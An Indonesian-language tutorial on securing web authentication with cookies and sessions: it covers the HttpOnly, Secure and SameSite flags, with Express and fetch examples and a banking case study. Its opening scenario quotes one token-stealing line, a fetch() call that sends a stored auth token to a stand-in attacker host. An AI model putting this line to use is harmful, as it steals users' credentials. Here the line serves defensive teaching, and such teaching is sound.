# Cookies and Sessions

## 1. Skenario Sistem Nyata

Sebuah aplikasi fintech menyimpan token otentikasi login pengguna di dalam browser `localStorage`. Suatu hari, salah satu dependensi npm pihak ketiga (library grafik analitik) terkena serangan *Supply Chain Attack*, di mana kode injeksi XSS berbahaya diselundupkan ke dalam bundle JavaScript.

Skrip penyusup mengeksekusi satu baris kode:
`fetch('https://evil-server.com/steal?token=' + localStorage.getItem('auth_token'))`

Dalam hitungan menit, token ribuan pengguna yang sedang aktif berhasil disedot ke server penyerang. Penyerang dapat melakukan impersonasi akun pengguna tanpa perlu mengetahui username dan password mereka.

Arsitektur sistem harus dimigrasikan dari client-side token storage ke otentikasi berbasis **Cookies & Sessions** yang dilindungi oleh flag browser modern.

## 2. Apa Itu dan Buat Apa?

Cookie adalah potongan kecil data (maksimum ~4KB) yang dikirimkan oleh server web melalui HTTP response header `Set-Cookie`, kemudian disimpan secara otomatis oleh browser, dan secara otomatis dilampirkan kembali pada setiap HTTP request berikutnya melalui header `Cookie`.

Session adalah state otentikasi atau data kontekstual pengguna yang diidentifikasi oleh sebuah identifier unik (*Session ID*).

Pada arsitektur sesi tradisional, browser hanya memegang Session ID di dalam cookie, sementara data pengguna (user ID, role, status aktif) tersimpan di storage server (Redis atau database).

Tujuan utama Cookies dan Sessions adalah menjaga status login (stateful session) pada protokol HTTP yang secara alamiah bersifat *stateless*.

## 3. Kenapa Harus Pakai Ini?

Dibandingkan menyimpan token di `localStorage` atau `sessionStorage`:
- **Kebal Pencurian XSS dengan `HttpOnly`**: Flag `HttpOnly` membuat cookie sama sekali tidak bisa dibaca, dimodifikasi, atau diakses oleh JavaScript (`document.cookie` mengembalikan string kosong untuk cookie tersebut). Jika aplikasi terkena bug XSS, penyerang tidak bisa mencuri session ID via skrip.
- **Enkripsi Transit Otomatis dengan `Secure`**: Flag `Secure` memastikan browser hanya mengirimkan cookie jika koneksi menggunakan protokol HTTPS terenkripsi, mencegah serangan *Man-in-the-Middle* (sniffing di Wi-Fi publik).
- **Perlindungan Pembajakan Antar Situs dengan `SameSite`**: Flag `SameSite=Lax` atau `SameSite=Strict` mengontrol apakah cookie otomatis dikirim saat user mengklik tautan dari website eksternal, menjadi fondasi utama penangkal serangan CSRF (Cross-Site Request Forgery).

## 4. Cara Kerjanya

Berikut adalah siklus hidup pembuatan dan pengiriman cookie sesi antara Browser dan Server:

```
[ User Browser ]                                              [ Web / API Server ]
       |                                                              |
       |--- 1. POST /api/login {email, password} -------------------->|
       |                                                              | (Validasi DB)
       |                                                              | (Buat Session di Redis)
       |<-- 2. HTTP 200 OK -------------------------------------------|
       |    Set-Cookie: session_id=xyz789; HttpOnly; Secure;          |
       |                SameSite=Lax; Path=/; Max-Age=86400           |
       |                                                              |
 (Browser menyimpan cookie secara terisolasi di internal storage)      |
 (JavaScript document.cookie TIDAK bisa mengakses session_id)         |
       |                                                              |
       |--- 3. GET /api/user/profile -------------------------------->|
       |    Cookie: session_id=xyz789                                 |
       |    (Browser otomatis melampirkan header Cookie)               | (Cari session_id di Redis)
       |                                                              | (User valid -> return data)
       |<-- 4. HTTP 200 OK { name: "Budi", role: "admin" } -----------|
       |                                                              |
       v                                                              v
```

## 5. Cuplikan Logika Inti

### Server-side: Menetapkan Cookie Aman (Node.js Express)

```typescript
// backend/src/controllers/auth.ts
import { Request, Response } from 'express';
import crypto from 'crypto';

export async function loginHandler(req: Request, res: Response) {
  const { email, password } = req.body;
  const user = await validateCredentials(email, password);

  if (!user) {
    return res.status(401).json({ message: 'Kredensial tidak valid' });
  }

  // Generate cryptographically secure random session ID
  const sessionId = crypto.randomBytes(32).toString('hex');

  // Simpan session ID ke Redis cache (expired dalam 24 jam)
  await redisClient.setEx(`session:${sessionId}`, 86400, JSON.stringify({
    userId: user.id,
    role: user.role,
  }));

  // Kirim Set-Cookie dengan konfigurasi keamanan ketat
  res.cookie('session_id', sessionId, {
    httpOnly: true,              // Blokir akses JavaScript (anti-XSS token stealing)
    secure: process.env.NODE_ENV === 'production', // Wajib HTTPS
    sameSite: 'lax',             // Lindungi dari serangan CSRF antar website
    maxAge: 24 * 60 * 60 * 1000, // 24 jam dalam milidetik
    path: '/',                   // Berlaku di seluruh rute domain
  });

  return res.json({ success: true, user: { name: user.name, role: user.role } });
}
```

### Client-side: Konsumsi Session Cookie di Frontend (Fetch API)

Frontend tidak perlu mengelola token secara manual di header; browser yang menanganinya:

```typescript
// frontend/src/api/client.ts
export async function fetchCurrentUser() {
  const response = await fetch('/api/user/profile', {
    method: 'GET',
    headers: {
      'Accept': 'application/json',
    },
    // Wajib: menginstruksikan browser mengirim dan menerima cookie
    credentials: 'include',
  });

  if (response.status === 401) {
    // Session expired atau invalid, redirect ke halaman login
    window.location.href = '/login';
    return null;
  }

  return await response.json();
}
```

## 6. Kelebihan dan Kekurangan (Trade-offs)

| Kelebihan | Kekurangan / Risiko |
| :--- | :--- |
| Kebal terhadap pencurian token oleh script XSS jika flag `HttpOnly` aktif | Rentan terhadap serangan CSRF jika flag `SameSite` tidak dikonfigurasi dengan benar |
| Ukuran network request lebih kecil dibanding menyematkan token JWT berukuran besar | Server membutuhkan central session store (seperti Redis cluster) untuk arsitektur multi-instance |
| Server dapat mencabut (*revoke*) sesi pengguna seketika dari Redis jika terjadi kompromi akun | Sulit digunakan untuk arsitektur multi-domain independen tanpa SSO atau proxy layer |

## 7. Kapan Harus Pakai vs Kapan Jangan Pakai

### Kapan Harus Pakai
- Website aplikasi web modern (SPA atau SSR) di mana keamanan data pengguna adalah prioritas utama (Fintech, Healthcare, E-Commerce).
- Sistem yang membutuhkan kemampuan *force logout* seketika (misal: fitur "Logout dari semua perangkat").
- Aplikasi monolitik atau decoupled dengan frontend dan backend berada di root domain yang sama (misal `app.domain.com` dan `api.domain.com`).

### Kapan Jangan Pakai
- Public REST API yang dikonsumsi oleh aplikasi Mobile native (iOS/Android), IoT device, atau integrasi server-to-server B2B (lebih cocok menggunakan header `Authorization: Bearer <token>`).
- Sistem tanpa database terpusat yang membutuhkan validasi otentikasi sepenuhnya *stateless* di edge network.

## 8. Metrik Kunci & Observabilitas

1. **Session Store Latency**: Waktu yang dibutuhkan backend untuk membaca sesi dari Redis/DB pada setiap request HTTP. Harus berada di bawah 5ms.
2. **Expired Cookie Invalidation Rate**: Jumlah request yang masuk dengan session ID yang sudah kedaluwarsa atau tidak valid di Redis (indikasi sesi habis masa berlaku atau upaya brute-force session).
3. **Cookie Payload Size**: Ukuran total header cookie pada setiap HTTP request. Pastikan tidak membengkak melebihi 4KB agar tidak memicu error HTTP 431 (*Request Header Fields Too Large*).

## 9. Studi Kasus Industri Nyata

Sebuah platform perbankan digital awalnya menggunakan JWT yang disimpan di cookie tanpa flag `HttpOnly` agar tim frontend dapat membaca klaim nama user langsung dari browser.

Audit pentest independen menemukan celah XSS pada fitur ulasan nasabah. Penyerang mendemonstrasikan bahwa skrip XSS mampu menyalin seluruh cookie nasabah dan mengirimkannya ke webhook publik, membajak akun nasabah dalam hitungan detik.

Tim engineering melakukan perbaikan total:
1. Memindahkan identifikasi user ke cookie sesi bertanda `HttpOnly`, `Secure`, dan `SameSite=Strict`.
2. Menyediakan endpoint terpisah `GET /api/me` untuk membaca profil pengguna secara aman melalui fetch resmi.
3. Menambahkan proses regenerasi Session ID setiap kali pengguna berhasil login untuk mencegah serangan *Session Fixation*.

Hasilnya, risiko pembajakan akun melalui script injection berhasil diturunkan menjadi nol.

## 10. Fakta Menarik & Gotchas Production

- **Batas Subdomain**: Cookie yang disetel di domain `sub.domain.com` secara default tidak bisa dibaca oleh `other.domain.com`. Jika ingin cookie bisa dibagikan antar subdomain, setel atribut `Domain=.domain.com`.
- **Aturan SameSite Modern**: Sejak Chrome versi 80+, browser secara otomatis menganggap cookie sebagai `SameSite=Lax` jika flag `SameSite` tidak didefinisikan secara eksplisit.
- **Session Fixation Gotcha**: Jangan pernah mempertahankan session ID yang sama sebelum dan sesudah user memasukkan password. Selalu hapus session lama dan terbitkan ID baru saat login berhasil agar penyerang tidak bisa menjebak user dengan session ID yang sudah disiapkan sebelumnya.

## 11. Rangkuman Singkat

Cookies dan Sessions adalah standar emas otentikasi browser yang aman. Dengan mengaktifkan kombinasi flag `HttpOnly` (anti-XSS), `Secure` (wajib HTTPS), dan `SameSite` (anti-CSRF), data otentikasi pengguna terlindungi secara optimal di level browser engine.
